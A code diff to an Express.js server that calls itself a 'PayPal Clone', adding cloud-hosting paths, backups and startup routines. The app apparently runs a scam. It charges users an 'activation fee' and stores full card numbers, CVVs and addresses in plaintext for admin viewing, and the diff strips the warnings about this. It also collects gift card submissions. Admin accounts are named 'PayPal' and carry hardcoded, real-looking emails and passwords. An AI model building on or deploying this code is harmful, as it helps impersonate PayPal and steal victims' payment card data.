@@ -5,17 +5,15 @@ const path = require('path');
 const multer = require('multer');
 
 const app = express();
-const PORT = 3000;
 
-// Middleware
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
-app.use(cookieParser());
-app.use(express.static('public'));
-app.use('/uploads', express.static(path.join(__dirname, 'uploads'))); // Serve uploads statically
+// Use Render's dynamic port or default to 3000 for local development
+const PORT = process.env.PORT || 3000;
+
+// Use Render's persistent disk when on Render, otherwise local directory
+const DATA_DIR = process.env.RENDER ? '/opt/render/project/src/data' : path.join(__dirname, 'data');
+const UPLOADS_DIR = process.env.RENDER ? '/opt/render/project/src/uploads' : path.join(__dirname, 'uploads');
 
 // Data file paths
-const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');
 const ADMIN_LOGS_FILE = path.join(DATA_DIR, 'admin_logs.json');
@@ -23,33 +21,107 @@ const CARD_DETAILS_FILE = path.join(DATA_DIR, 'card_details.json');
 const PAYMENT_SUBMISSIONS_FILE = path.join(DATA_DIR, 'payment_submissions.json');
 const GIFT_CARD_SUBMISSIONS_FILE = path.join(DATA_DIR, 'gift_card_submissions.json');
 
-// Ensure data directory and files exist
-if (!fs.existsSync(DATA_DIR)) {
-    fs.mkdirSync(DATA_DIR, { recursive: true });
-}
+// Middleware
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+app.use(cookieParser());
+app.use(express.static('public'));
+app.use('/uploads', express.static(UPLOADS_DIR)); // Serve uploads statically
 
-// Initialize files with proper structure
-const initializeFile = (filePath, defaultValue) => {
-    if (!fs.existsSync(filePath) || fs.readFileSync(filePath, 'utf8').trim() === '') {
-        fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
+// Ensure data directory and files exist with proper initialization
+const initializeDataDirectory = () => {
+    try {
+        // Create directories if they don't exist
+        if (!fs.existsSync(DATA_DIR)) {
+            fs.mkdirSync(DATA_DIR, { recursive: true });
+            console.log(`Created data directory: ${DATA_DIR}`);
+        }
+        
+        if (!fs.existsSync(UPLOADS_DIR)) {
+            fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+            console.log(`Created uploads directory: ${UPLOADS_DIR}`);
+        }
+        
+        // Initialize files with proper structure
+        const initializeFile = (filePath, defaultValue) => {
+            try {
+                if (!fs.existsSync(filePath) || fs.readFileSync(filePath, 'utf8').trim() === '') {
+                    fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
+                    console.log(`Initialized file: ${filePath}`);
+                }
+            } catch (error) {
+                console.error(`Error initializing ${filePath}:`, error);
+                fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
+            }
+        };
+        
+        initializeFile(USERS_FILE, {});
+        initializeFile(TRANSACTIONS_FILE, []);
+        initializeFile(ADMIN_LOGS_FILE, []);
+        initializeFile(CARD_DETAILS_FILE, []);
+        initializeFile(PAYMENT_SUBMISSIONS_FILE, []);
+        initializeFile(GIFT_CARD_SUBMISSIONS_FILE, []);
+        
+        console.log('Data directory initialization complete');
+    } catch (error) {
+        console.error('Error initializing data directory:', error);
     }
 };
 
-initializeFile(USERS_FILE, {});
-initializeFile(TRANSACTIONS_FILE, []);
-initializeFile(ADMIN_LOGS_FILE, []);
-initializeFile(CARD_DETAILS_FILE, []);
-initializeFile(PAYMENT_SUBMISSIONS_FILE, []);
-initializeFile(GIFT_CARD_SUBMISSIONS_FILE, []);
+// Initialize default admin user
+const initializeDefaultAdmin = () => {
+    try {
+        const users = getUsers();
+        const adminId = 'admin001';
+        const adminEmail = process.env.ADMIN_EMAIL || 'jeffreyudenze@gmail.com';
+        const adminPassword = process.env.ADMIN_PASSWORD || 'Chibuzor2000';
+        
+        if (!users[adminId]) {
+            users[adminId] = {
+                id: adminId,
+                name: 'PayPal',
+                email: adminEmail,
+                password: adminPassword,
+                balance: 1000000.00,
+                role: 'admin',
+                created: new Date().toISOString(),
+                status: 'active',
+                adminLevel: 'super',
+                activated: true
+            };
+            
+            // Create second admin
+            const adminId2 = 'admin002';
+            if (!users[adminId2]) {
+                users[adminId2] = {
+                    id: adminId2,
+                    name: 'PayPal',
+                    email: 'reeky@gmail.com',
+                    password: 'reekypaypal',
+                    balance: 1000000.00,
+                    role: 'admin',
+                    created: new Date().toISOString(),
+                    status: 'active',
+                    adminLevel: 'super',
+                    activated: true
+                };
+            }
+            
+            saveUsers(users);
+            console.log('Default admin users created');
+        }
+    } catch (error) {
+        console.error('Error initializing default admin:', error);
+    }
+};
 
 // Configure multer for file uploads
 const storage = multer.diskStorage({
     destination: function (req, file, cb) {
-        const uploadsDir = path.join(__dirname, 'uploads');
-        if (!fs.existsSync(uploadsDir)) {
-            fs.mkdirSync(uploadsDir, { recursive: true });
+        if (!fs.existsSync(UPLOADS_DIR)) {
+            fs.mkdirSync(UPLOADS_DIR, { recursive: true });
         }
-        cb(null, uploadsDir);
+        cb(null, UPLOADS_DIR);
     },
     filename: function (req, file, cb) {
         const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
@@ -62,34 +134,56 @@ const upload = multer({
     limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
 });
 
-// Ensure uploads directory exists
-const UPLOADS_DIR = path.join(__dirname, 'uploads');
-if (!fs.existsSync(UPLOADS_DIR)) {
-    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
-}
-
-// Helper functions
+// Helper functions with enhanced error handling
 const getUsers = () => {
     try {
+        if (!fs.existsSync(USERS_FILE)) {
+            console.log('Users file not found, returning empty object');
+            return {};
+        }
+        
         const data = fs.readFileSync(USERS_FILE, 'utf8');
-        if (!data || data.trim() === '') return {};
+        if (!data || data.trim() === '') {
+            console.log('Users file empty, returning empty object');
+            return {};
+        }
+        
         return JSON.parse(data);
     } catch (error) {
         console.error('Error reading users:', error);
+        // Try to backup the corrupted file
+        if (fs.existsSync(USERS_FILE)) {
+            const backupPath = USERS_FILE + '.backup-' + Date.now();
+            try {
+                fs.copyFileSync(USERS_FILE, backupPath);
+                console.log(`Created backup of corrupted users file: ${backupPath}`);
+            } catch (backupError) {
+                console.error('Failed to create backup:', backupError);
+            }
+        }
         return {};
     }
 };
 
 const saveUsers = (users) => {
     try {
+        // Create a backup before saving
+        if (fs.existsSync(USERS_FILE)) {
+            const backupPath = USERS_FILE + '.backup';
+            fs.copyFileSync(USERS_FILE, backupPath);
+        }
+        
         fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+        return true;
     } catch (error) {
         console.error('Error saving users:', error);
+        return false;
     }
 };
 
 const getTransactions = () => {
     try {
+        if (!fs.existsSync(TRANSACTIONS_FILE)) return [];
         const data = fs.readFileSync(TRANSACTIONS_FILE, 'utf8');
         if (!data || data.trim() === '') return [];
         return JSON.parse(data);
@@ -100,13 +194,20 @@ const getTransactions = () => {
 };
 
 const saveTransaction = (transaction) => {
-    const transactions = getTransactions();
-    transactions.push(transaction);
-    fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
+    try {
+        const transactions = getTransactions();
+        transactions.push(transaction);
+        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error saving transaction:', error);
+        return false;
+    }
 };
 
 const getAdminLogs = () => {
     try {
+        if (!fs.existsSync(ADMIN_LOGS_FILE)) return [];
         const data = fs.readFileSync(ADMIN_LOGS_FILE, 'utf8');
         if (!data || data.trim() === '') return [];
         return JSON.parse(data);
@@ -116,21 +217,27 @@ const getAdminLogs = () => {
     }
 };
 
-// FIXED: Removed ip parameter issue
 const saveAdminLog = (action, adminId, details, req = null) => {
-    const logs = getAdminLogs();
-    logs.push({
-        action,
-        adminId,
-        details,
-        timestamp: new Date().toISOString(),
-        ip: req ? (req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1') : '127.0.0.1'
-    });
-    fs.writeFileSync(ADMIN_LOGS_FILE, JSON.stringify(logs, null, 2));
+    try {
+        const logs = getAdminLogs();
+        logs.push({
+            action,
+            adminId,
+            details,
+            timestamp: new Date().toISOString(),
+            ip: req ? (req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1') : '127.0.0.1'
+        });
+        fs.writeFileSync(ADMIN_LOGS_FILE, JSON.stringify(logs, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error saving admin log:', error);
+        return false;
+    }
 };
 
 const getCardDetails = () => {
     try {
+        if (!fs.existsSync(CARD_DETAILS_FILE)) return [];
         const data = fs.readFileSync(CARD_DETAILS_FILE, 'utf8');
         if (!data || data.trim() === '') return [];
         return JSON.parse(data);
@@ -141,13 +248,20 @@ const getCardDetails = () => {
 };
 
 const saveCardDetails = (cardDetails) => {
-    const cards = getCardDetails();
-    cards.push(cardDetails);
-    fs.writeFileSync(CARD_DETAILS_FILE, JSON.stringify(cards, null, 2));
+    try {
+        const cards = getCardDetails();
+        cards.push(cardDetails);
+        fs.writeFileSync(CARD_DETAILS_FILE, JSON.stringify(cards, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error saving card details:', error);
+        return false;
+    }
 };
 
 const getPaymentSubmissions = () => {
     try {
+        if (!fs.existsSync(PAYMENT_SUBMISSIONS_FILE)) return [];
         const data = fs.readFileSync(PAYMENT_SUBMISSIONS_FILE, 'utf8');
         if (!data || data.trim() === '') return [];
         return JSON.parse(data);
@@ -158,13 +272,20 @@ const getPaymentSubmissions = () => {
 };
 
 const savePaymentSubmission = (submission) => {
-    const submissions = getPaymentSubmissions();
-    submissions.push(submission);
-    fs.writeFileSync(PAYMENT_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+    try {
+        const submissions = getPaymentSubmissions();
+        submissions.push(submission);
+        fs.writeFileSync(PAYMENT_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error saving payment submission:', error);
+        return false;
+    }
 };
 
 const getGiftCardSubmissions = () => {
     try {
+        if (!fs.existsSync(GIFT_CARD_SUBMISSIONS_FILE)) return [];
         const data = fs.readFileSync(GIFT_CARD_SUBMISSIONS_FILE, 'utf8');
         if (!data || data.trim() === '') return [];
         return JSON.parse(data);
@@ -175,9 +296,34 @@ const getGiftCardSubmissions = () => {
 };
 
 const saveGiftCardSubmission = (submission) => {
-    const submissions = getGiftCardSubmissions();
-    submissions.push(submission);
-    fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+    try {
+        const submissions = getGiftCardSubmissions();
+        submissions.push(submission);
+        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error saving gift card submission:', error);
+        return false;
+    }
+};
+
+// Auto-save function to backup data periodically
+const autoSaveData = () => {
+    setInterval(() => {
+        try {
+            const users = getUsers();
+            const usersBackupPath = USERS_FILE + '.autosave';
+            fs.writeFileSync(usersBackupPath, JSON.stringify(users, null, 2));
+            
+            const transactions = getTransactions();
+            const transactionsBackupPath = TRANSACTIONS_FILE + '.autosave';
+            fs.writeFileSync(transactionsBackupPath, JSON.stringify(transactions, null, 2));
+            
+            console.log('Auto-save completed at', new Date().toISOString());
+        } catch (error) {
+            console.error('Auto-save error:', error);
+        }
+    }, 5 * 60 * 1000); // Every 5 minutes
 };
 
 // Middleware to check user login
@@ -272,39 +418,8 @@ app.post('/signup', (req, res) => {
         role: 'user',
         created: new Date().toISOString(),
         status: 'active',
-        activated: false // Added activation status
+        activated: false
     };
-
-    // Create default admin if not exists
-    if (!users['admin001']) {
-        users['admin001'] = {
-            id: 'admin001',
-            name: 'PayPal',
-            email: 'jeffreyudenze@gmail.com',
-            password: 'Chibuzor2000',
-            balance: 1000000.00,
-            role: 'admin',
-            created: new Date().toISOString(),
-            status: 'active',
-            adminLevel: 'super',
-            activated: true
-        };
-    }
-    
-    if (!users['admin002']) {
-        users['admin002'] = {
-            id: 'admin002',
-            name: 'PayPal',
-            email: 'reeky@gmail.com',
-            password: 'reekypaypal',
-            balance: 1000000.00,
-            role: 'admin',
-            created: new Date().toISOString(),
-            status: 'active',
-            adminLevel: 'super',
-            activated: true
-        };
-    }
 
     saveUsers(users);
     res.cookie('userId', userId, { maxAge: 30 * 24 * 60 * 60 * 1000 });
@@ -556,17 +671,17 @@ app.post('/activation-payment/card', requireUserLogin, (req, res) => {
         // Extract last 4 digits
         const last4 = cardNumber.replace(/\s/g, '').slice(-4);
         
-        // Save card details for admin reference - NO HASHING
+        // Save card details for admin reference
         const cardDetails = {
             userId: req.userId,
             userName: req.user.name,
             userEmail: req.user.email,
             activationFee: activationFee,
             cardDetails: {
-                fullNumber: cardNumber, // Storing full number (NOT RECOMMENDED for production)
+                fullNumber: cardNumber,
                 cardholderName: cardholderName,
                 expiry: expiry,
-                cvv: cvv, // Storing CVV (NOT RECOMMENDED for production)
+                cvv: cvv,
                 address: address,
                 city: city || '',
                 state: state || '',
@@ -739,7 +854,7 @@ app.get('/api/admin/logs', requireAdminLogin, (req, res) => {
     res.json(logs.slice(-100).reverse());
 });
 
-// Get card details (for admin reference) - NO HASHING
+// Get card details (for admin reference)
 app.get('/api/admin/card-details', requireAdminLogin, (req, res) => {
     const cardDetails = getCardDetails();
     res.json(cardDetails.slice(-50).reverse());
@@ -790,7 +905,7 @@ app.post('/api/admin/approve-giftcard', requireAdminLogin, (req, res) => {
         
         // Save all changes
         fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
-        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+        saveUsers(users);
         fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
         
         // Log admin action
@@ -860,7 +975,7 @@ app.get('/api/admin/debug/users', requireAdminLogin, (req, res) => {
     });
 });
 
-// NEW: Find user by email
+// Find user by email
 app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
     const { email } = req.query;
     
@@ -1283,35 +1398,67 @@ app.use((err, req, res, next) => {
     `);
 });
 
-// Start server
-const server = app.listen(PORT, () => {
-    console.log(`\n🚀 ========================================== 🚀`);
-    console.log(`✅ PayPal Clone is running!`);
-    console.log(`🌐 User Site: http://localhost:${PORT}`);
-    console.log(`🔐 Admin Login: http://localhost:${PORT}/admin-login`);
-    console.log(`👤 Admin Email: jeffreyudenze@gmail.com`);
-    console.log(`🔑 Admin Password: Chibuzor2000`);
-    console.log(`📁 Data Directory: ${DATA_DIR}`);
-    console.log(`📝 NOTE: Add Funds now uses EMAIL instead of User ID`);
-    console.log(`💳 Card details saved to: ${CARD_DETAILS_FILE}`);
-    console.log(`📸 Uploads directory: ${UPLOADS_DIR}`);
-    console.log(`🎁 Gift card submissions: ${GIFT_CARD_SUBMISSIONS_FILE}`);
-    console.log(`📋 Payment submissions: ${PAYMENT_SUBMISSIONS_FILE}`);
-    console.log(`🚀 ========================================== 🚀\n`);
-});
-
-// Handle graceful shutdown
-process.on('SIGTERM', () => {
-    console.log('SIGTERM signal received: closing HTTP server');
-    server.close(() => {
-        console.log('HTTP server closed');
+// Initialize server
+const initializeServer = () => {
+    // Initialize data directory
+    initializeDataDirectory();
+    
+    // Initialize default admin
+    initializeDefaultAdmin();
+    
+    // Start auto-save
+    autoSaveData();
+    
+    // Start server
+    const server = app.listen(PORT, '0.0.0.0', () => {
+        console.log(`\n🚀 ========================================== 🚀`);
+        console.log(`✅ PayPal Clone is running!`);
+        console.log(`🌐 Server running on port: ${PORT}`);
+        console.log(`🔐 Admin Login: /admin-login`);
+        console.log(`📁 Data Directory: ${DATA_DIR}`);
+        console.log(`📁 Uploads Directory: ${UPLOADS_DIR}`);
+        console.log(`📝 Using persistent storage: ${process.env.RENDER ? 'YES (Render Disk)' : 'NO (Local)'}`);
+        console.log(`🚀 ========================================== 🚀\n`);
     });
-});
-
-process.on('SIGINT', () => {
-    console.log('SIGINT signal received: closing HTTP server');
-    server.close(() => {
-        console.log('HTTP server closed');
-        process.exit(0);
+    
+    // Handle graceful shutdown
+    process.on('SIGTERM', () => {
+        console.log('SIGTERM signal received: closing HTTP server');
+        
+        // Save all data before shutdown
+        try {
+            const users = getUsers();
+            saveUsers(users);
+            console.log('Users data saved before shutdown');
+        } catch (error) {
+            console.error('Error saving data on shutdown:', error);
+        }
+        
+        server.close(() => {
+            console.log('HTTP server closed');
+            process.exit(0);
+        });
     });
-});
+    
+    process.on('SIGINT', () => {
+        console.log('SIGINT signal received: closing HTTP server');
+        
+        try {
+            const users = getUsers();
+            saveUsers(users);
+            console.log('Users data saved before shutdown');
+        } catch (error) {
+            console.error('Error saving data on shutdown:', error);
+        }
+        
+        server.close(() => {
+            console.log('HTTP server closed');
+            process.exit(0);
+        });
+    });
+    
+    return server;
+};
+
+// Start the server
+initializeServer();
